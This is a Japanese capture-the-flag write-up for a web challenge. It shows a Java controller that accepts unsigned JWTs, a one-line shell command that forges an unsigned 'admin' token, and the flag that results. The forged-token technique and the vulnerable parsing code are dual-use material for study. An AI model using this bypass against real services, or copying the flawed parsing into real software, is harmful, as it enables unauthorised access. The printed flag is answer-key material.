# jalyboy-baby:Web:100pts
It's almost spring. I like spring, but I don't like hay fever.  
[http://34.84.28.50:10000/](http://34.84.28.50:10000/)  

[jalyboy-baby_7a1dfa2b72cd021aa085071bc93efada.zip](jalyboy-baby_7a1dfa2b72cd021aa085071bc93efada.zip)  

# Solution
URLとソースが渡される。  
アクセスするとボタンで`guest`になれるサービスのようだが、`admin`にはなれない。  
![site.png](site/site.png)  
URLクエリを見ると、以下のようであった。  
```
http://34.84.28.50:10000/?j=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJndWVzdCJ9.rUKzvxAwpuro6UF6KETwbMPCLBsPGUScjSEZtQGjfX4
```
jwtでユーザを管理しているようだ。  
ペイロードは以下であった。  
```json
{
  "sub": "guest"
}
```
ここをどうにかして`admin`にしたい。  
ソースを見ると主要部分は以下であった。  
```java
~~~
@Controller
public class JwtController {

    public static final String ADMIN = "admin";
    public static final String GUEST = "guest";
    public static final String UNKNOWN = "unknown";
    public static final String FLAG = System.getenv("FLAG");
    Key secretKey = Keys.secretKeyFor(SignatureAlgorithm.HS256);

    @GetMapping("/")
    public String index(@RequestParam(required = false) String j, Model model) {
        String sub = UNKNOWN;
        String jwt_guest = Jwts.builder().setSubject(GUEST).signWith(secretKey).compact();

        try {
            Jwt jwt = Jwts.parser().setSigningKey(secretKey).parse(j);
            Claims claims = (Claims) jwt.getBody();
            if (claims.getSubject().equals(ADMIN)) {
                sub = ADMIN;
            } else if (claims.getSubject().equals(GUEST)) {
                sub = GUEST;
            }
        } catch (Exception e) {
//            e.printStackTrace();
        }

        model.addAttribute("jwt", jwt_guest);
        model.addAttribute("sub", sub);
        if (sub.equals(ADMIN)) model.addAttribute("flag", FLAG);

        return "index";
    }
}
```
署名の検証が行われていないので、そのまま`admin`に改竄すればよさそうだ。  
以下のように行う。  
```bash
$ # eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJndWVzdCJ9.rUKzvxAwpuro6UF6KETwbMPCLBsPGUScjSEZtQGjfX4
$ echo "eyJhbGciOiJIUzI1NiJ9.`echo -n '{ "sub": "admin" }' | base64`."
eyJhbGciOiJIUzI1NiJ9.eyAic3ViIjogImFkbWluIiB9.
```
URLのクエリに設定してアクセスする。  
![flag.png](site/flag.png)  
flagが得られた。  

## LINECTF{337e737f9f2594a02c5c752373212ef7}